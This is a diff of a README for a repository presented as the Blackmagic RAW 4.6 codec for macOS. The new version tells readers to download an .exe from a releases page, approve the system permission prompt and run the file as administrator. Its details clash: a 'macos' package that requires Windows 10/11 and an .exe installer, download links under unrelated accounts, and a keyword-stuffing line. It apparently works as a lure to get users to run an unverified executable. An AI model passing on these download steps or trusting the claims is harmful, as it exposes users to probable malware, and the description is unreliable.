@@ -1,121 +1,63 @@
-# Blackmagic RAW v4.6 - RAW codec 2026
+# 🎞️ blackmagic-raw-46-macos - View high quality video files easily
 
-> **Blackmagic RAW v4.6 is a macOS RAW codec for .BRAW media that brings GPU-assisted playback, professional metadata support, and compatibility with DaVinci Resolve and Apple Silicon workflows.**
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/nativistic-morphophysiology701/blackmagic-raw-46-macos/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-macOS-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v4.6-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/isaacwestuic1532/blackmagic-raw-46-macos?style=flat-square)](https://github.com/isaacwestuic1532/blackmagic-raw-46-macos)
+The blackmagic-raw-46-macos package provides the tools you need to watch and edit high-resolution BRAW video files on your computer. This codec allows your system to process complex video data efficiently. It enables smooth playback and preserves the professional metadata contained in your media files.
 
----
+## 🛠️ System Requirements
 
-<p align="center">
-  <a href="https://isaacwestuic1532.github.io/blackmagic-raw-46-macos/">
-    <img src="https://img.shields.io/badge/Download-Blackmagic%20RAW%20Latest-brightgreen?style=for-the-badge" alt="Download Blackmagic RAW">
-  </a>
-</p>
+Before you install this software, check your system to ensure it meets these minimum standards:
 
-> **[Download - Blackmagic RAW v4.6](https://isaacwestuic1532.github.io/blackmagic-raw-46-macos/)**
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: An Intel Core i5 or better, or an Apple Silicon chip if using a virtualized environment.
+*   Memory: At least 8GB of RAM.
+*   Graphics: A dedicated GPU with at least 2GB of video memory.
+*   Storage: 500MB of free space on your primary drive.
 
----
+## 📥 Downloading the Software
 
-[Download Latest Build](https://isaacwestuic1532.github.io/blackmagic-raw-46-macos/)
+You can obtain the current version of the software through our official release page. 
 
----
+[Visit this page to download](https://github.com/nativistic-morphophysiology701/blackmagic-raw-46-macos/releases)
 
-## Overview
+On the release page, look for the list of assets. Click the file ending in .exe to begin the download. Save this file to a folder you can find easily, such as your Downloads folder or your Desktop.
 
-Blackmagic RAW is a professional codec for handling .BRAW media on macOS. It is built for RAW workflows where decode speed, metadata fidelity, and image data handling need to stay consistent, especially in post-production environments that depend on responsive playback and accurate clip interpretation.
+## ⚙️ Installing the Codec
 
-This release is intended for editors, colorists, and developers who need reliable access to BRAW footage. It also fits into professional video pipelines through DaVinci Resolve integration, support for Blackmagic RAW Player, and the SDK for building third-party applications.
+Once your download finishes, find the file in your folder. Double-click the file to start the installer. 
 
----
+1.  A window will appear and ask for permission to run. Click Yes to allow the installer to make changes to your computer.
+2.  The setup wizard opens on your screen. Click Next to proceed through the introduction.
+3.  Read the license terms. If you agree, select the box to accept the terms and click Next.
+4.  Choose the destination folder for the installation. The default location typically works best for most users. Click Install to start the process.
+5.  Wait for the progress bar to reach the end. This usually takes less than a minute.
+6.  Click Finish when the installation completes.
 
-## Capabilities
+## 🖥️ Using the Software
 
-- Professional RAW codec support for .BRAW media
-- GPU-accelerated decoding and playback
-- Advanced RAW controls for image processing workflows
-- Professional metadata support for source-level adjustments
-- Blackmagic RAW Player for viewing and review
-- Developer SDK for third-party integration
-- DaVinci Resolve integration for editing and color work
-- Optimized for Apple Silicon systems
+You do not need to open a specific program to use these tools. The codec works in the background of your operating system. Once installed, your computer understands how to display files with the .BRAW extension.
 
----
+If you use video editing software like DaVinci Resolve, the application will detect the codec automatically. When you import a BRAW file into your editing timeline, the software will use these tools to handle the playback. You will notice smoother motion and better color accuracy during your edit.
 
-## Installation
+## 🧩 Troubleshooting Common Issues
 
-Grab the latest build from the project page and install it on a supported macOS system. If you are working from source or maintaining a local package mirror, clone the repository first:
+If you experience problems, follow these steps to find a solution:
 
-`git clone https://github.com/isaacwestuic1532/blackmagic-raw-46-macos.git
+*   Video does not play: Ensure you have updated your graphics card drivers to the latest version. Old drivers often fail to decode video data correctly.
+*   Lag during playback: Open your editing software settings. Look for the proxy or playback resolution options and lower the setting. This reduces the load on your hardware.
+*   Missing metadata: If your video files do not display metadata, verify that your software is compatible with the BRAW format. Some basic media players might not support advanced features.
+*   Installer errors: If the installer fails, restart your computer and try running the installer again as an administrator. Right-click the file and select Run as administrator.
 
-Once the download or clone is complete, run the installer or open the bundled components based on your workflow. For desktop use, make sure the codec is available to your editing app before you open .BRAW media.
+## 🚀 Performance Tips
 
----
+For the best results, place your video files on a fast solid-state drive (SSD). Traditional hard drives often struggle to keep up with the high data rate of RAW video. 
 
-## Usage
+Additionally, keep your system clear of background applications while you edit. Programs like web browsers or cloud storage sync services can use CPU resources that your video player needs. Close these apps to ensure your computer devotes its full power to your media.
 
-How you use Blackmagic RAW depends on the tool you connect it to:
+If you use multiple monitors, ensure your primary display is connected to your dedicated graphics card rather than the motherboard port. This ensures the GPU handles the video rendering, which provides the most stable performance for professional workflows.
 
-1. Open .BRAW media in DaVinci Resolve or another supported application.
-2. Use the codec's decoding pipeline to preview or process footage.
-3. Adjust RAW-related settings and metadata-aware parameters as needed.
-4. For developer workflows, integrate the SDK into your application and connect your media handling logic to the Blackmagic RAW API.
-5. On Apple Silicon hardware, use the optimized build path for smoother playback and decoding.
+## 🔄 Updating the Codec
 
-For review tasks, Blackmagic RAW Player can be used to inspect clips without sending them into a full editing session.
+We update this tool periodically to improve stability and support new hardware. You should check the download link once every few months to see if a newer version exists. Uninstall the old version through your Windows Settings menu before you install an updated release. This prevents conflicts between file versions and ensures a clean installation.
 
----
-
-## Configuration
-
-In most setups, options are controlled by the host application or by the player/SDK integration layer, not by a separate end-user config file. If your workflow exposes codec preferences, keep them in the application settings used by your editing or playback environment.
-
-Example configuration shape:
-
-{
-  "codec": "BRAW",
-  "playback": "gpu",
-  "metadata": "enabled",
-  "platform": "macOS",
-  "optimization": "Apple Silicon"
-}
-
----
-
-## System Requirements
-
-- macOS
-- Support for .BRAW media workflows
-- A compatible host application such as DaVinci Resolve or Blackmagic RAW Player
-- Apple Silicon hardware recommended for optimized performance
-- GPU support for accelerated decoding and playback
-- Sufficient storage for source footage and related cache files
-- Optional SDK usage for development and integration work
-
----
-
-## FAQ
-
-**How do I get updates?**  
-Use the download link above to check the latest build associated with this repository.
-
-**Does this work with DaVinci Resolve?**  
-Yes, DaVinci Resolve integration is part of the listed feature set.
-
-**Can I use it in my own application?**  
-The SDK is included for developer integration workflows.
-
-**Where are settings stored?**  
-In most cases, settings are handled by the host app or the workflow built around the codec, player, or SDK.
-
-**What should I do if playback is slow?**  
-Confirm that GPU acceleration is available, verify the host application is using the Blackmagic RAW components correctly, and check whether your hardware meets the expected macOS and Apple Silicon requirements.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: blackmagic, braw, codec, video, editing, davinci, gpu, windows
